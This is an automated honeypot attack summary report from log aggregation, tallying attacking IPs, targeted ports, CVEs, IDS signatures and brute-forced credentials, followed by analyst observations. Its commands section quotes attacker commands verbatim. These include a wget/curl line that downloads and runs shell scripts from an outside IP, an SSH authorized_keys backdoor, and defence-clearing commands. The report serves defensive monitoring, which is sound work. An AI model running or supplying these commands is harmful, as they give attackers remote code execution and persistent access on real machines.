## Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-27T12:01:34Z
**Timeframe:** 2025-10-27T11:20:01Z to 2025-10-27T12:00:02Z
**Log Files:**
- agg_log_20251027T112001Z.json
- agg_log_20251027T114001Z.json
- agg_log_20251027T120002Z.json

### Executive Summary
This report summarizes honeypot activity over the past hour, based on data from three log files. A total of 18,362 attacks were recorded. The most active honeypots were Cowrie, Suricata, and Dionaea. The most common attacks targeted SMB (port 445) and SIP (port 5060). A significant number of attacks were associated with CVE-2005-4050. Attackers were observed attempting to download and execute malicious scripts.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 5214
- Suricata: 3276
- Dionaea: 3297
- Honeytrap: 2635
- Ciscoasa: 1971
- Sentrypeer: 1560
- Adbhoney: 101
- Mailoney: 88
- Tanner: 65
- ConPot: 49
- Miniprint: 31
- H0neytr4p: 22
- Redishoneypot: 18
- Heralding: 17
- ElasticPot: 6
- Honeyaml: 6
- Dicompot: 4
- ssh-rsa: 2

**Top Attacking IPs:**
- 103.15.213.90: 3131
- 198.23.190.58: 2266
- 95.67.205.232: 865
- 34.66.72.251: 437
- 14.139.182.11: 410
- 36.50.176.144: 407
- 103.139.193.37: 392
- 92.205.57.72: 293
- 103.217.144.65: 261
- 107.170.36.5: 251
- 68.183.46.135: 194
- 173.249.59.114: 234
- 20.127.224.153: 168
- 103.215.80.173: 161
- 185.76.32.44: 194
- 59.36.78.66: 129
- 193.106.245.20: 124
- 88.210.63.16: 120
- 14.103.90.3: 104
- 14.103.114.196: 93

**Top Targeted Ports/Protocols:**
- 445: 3231
- TCP/445: 862
- 5060: 1560
- UDP/5060: 770
- 22: 674
- TCP/22: 99
- 80: 56
- TCP/80: 96
- 5903: 132
- 5901: 122
- 55577: 81
- 25: 88
- 1337: 76
- 7788: 51
- 5904: 78
- 5905: 76
- 5909: 49
- 5907: 49
- 5908: 51
- 10250: 46

**Most Common CVEs:**
- CVE-2005-4050: 757
- CVE-2002-0013 CVE-2002-0012: 7
- CVE-2024-4577 CVE-2024-4577: 2
- CVE-2024-4577 CVE-2002-0953: 2
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 2
- CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255: 2
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773: 1
- CVE-2021-42013 CVE-2021-42013: 1
- CVE-2001-0414: 1

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 36
- lockr -ia .ssh: 36
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~: 36
- cat /proc/cpuinfo | grep name | wc -l: 35
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 36
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 36
- ls -lh $(which ls): 36
- which ls: 36
- crontab -l: 36
- w: 36
- uname -m: 36
- cat /proc/cpuinfo | grep model | grep name | wc -l: 36
- top: 36
- uname: 36
- uname -a: 36
- whoami: 36
- lscpu | grep Model: 36
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 36
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;: 15
- Enter new UNIX password: : 11
- Enter new UNIX password:": 7
- cd /data/local/tmp/; busybox wget http://202.55.132.254/w.sh; sh w.sh; curl http://202.55.132.254/c.sh; sh c.sh; wget http://202.55.132.254/wget.sh; sh wget.sh; curl http://202.55.132.254/wget.sh; sh wget.sh; busybox wget http://202.55.132.254/wget.sh; sh wget.sh; busybox curl http://202.55.132.254/wget.sh; sh wget.sh: 8

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 859
- 2024766: 859
- ET VOIP MultiTech SIP UDP Overflow: 757
- 2003237: 757
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 412
- 2023753: 412
- ET DROP Dshield Block Listed Source group 1: 263
- 2402000: 263
- ET SCAN NMAP -sS window 1024: 188
- 2009582: 188
- ET HUNTING RDP Authentication Bypass Attempt: 185
- 2034857: 185
- ET INFO Reserved Internal IP Traffic: 60
- 2002752: 60
- ET SCAN Potential SSH Scan: 35
- 2001219: 35
- ET INFO curl User-Agent Outbound: 24
- 2013028: 24
- ET HUNTING curl User-Agent to Dotted Quad: 12
- 2034567: 12

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34: 32
- root/3245gs5662d34: 21
- jla/xurros22$: 16
- root/: 11
- systemd/Voidsetdownload.so: 8
- root/ipdshualweb: 4
- root/ipscar: 4
- root/ipsource: 4
- rcmd/rcmd: 4
- jla/xurros22$,: 6
- root/ippbx1820: 4
- root/ipsafe: 4
- finn/finn123: 5
- oracle/J5cmmu=Kyf0-br8CsW: 5
- root/general: 3
- root/ipdsweb: 3
- kazu/kazu: 3
- ubuntu/!QAZxsw2: 3
- root/realtime: 3
- root/ab@123321: 3
- root/abcde: 3
- root/video123: 3
- django/1234: 3
- user/Qwer!234: 3
- root/iptech157: 3

**Files Uploaded/Downloaded:**
- sh: 98
- wget.sh;: 36
- w.sh;: 9
- c.sh;: 9
- arm.uhavenobotsxd;: 2
- arm.uhavenobotsxd: 2
- arm5.uhavenobotsxd;: 2
- arm5.uhavenobotsxd: 2
- arm6.uhavenobotsxd;: 2
- arm6.uhavenobotsxd: 2
- arm7.uhavenobotsxd;: 2
- arm7.uhavenobotsxd: 2
- x86_32.uhavenobotsxd;: 2
- x86_32.uhavenobotsxd: 2
- mips.uhavenobotsxd;: 2
- mips.uhavenobotsxd: 2
- mipsel.uhavenobotsxd;: 2
- mipsel.uhavenobotsxd: 2
- github.githubassets.com: 2
- avatars.githubusercontent.com: 2
- light-44e67b0cd5d5.css: 2
- welcome.jpg): 1
- writing.jpg): 1
- tags.jpg): 1
- github-cloud.s3.amazonaws.com: 1
- light_high_contrast-b51c2fae25e8.css: 1
- dark-cb035ed575b8.css: 1
- dark_high_contrast-99e9b1169976.css: 1

**HTTP User-Agents:**
- None Observed

**SSH Clients:**
- None Observed

**SSH Servers:**
- None Observed

**Top Attacker AS Organizations:**
- None Observed

### Key Observations and Anomalies
- The vast majority of attacks are automated and opportunistic, scanning for common vulnerabilities and open ports.
- The high number of attempts to download and execute shell scripts (`.sh` files) indicates a prevalent campaign to install malware or add the compromised machine to a botnet.
- The repeated attempts to modify SSH authorized_keys files show a clear intent to establish persistent access.
- The presence of commands like `cat /proc/cpuinfo` and `uname -a` suggests that attackers are performing reconnaissance to understand the environment of the compromised system.
- The `DoublePulsar Backdoor` signature indicates that some of the SMB attacks are likely attempting to exploit the EternalBlue vulnerability.
- There is a noticeable amount of scanning for MS Terminal Server and RDP, suggesting attempts to compromise systems via remote desktop services.
- The variety of credentials used in brute-force attacks indicates that attackers are using large dictionaries of common and default usernames and passwords.
- The filenames `arm.uhavenobotsxd`, `mips.uhavenobotsxd`, etc., suggest an attempt to deploy malware targeting a wide range of CPU architectures, likely for IoT devices.
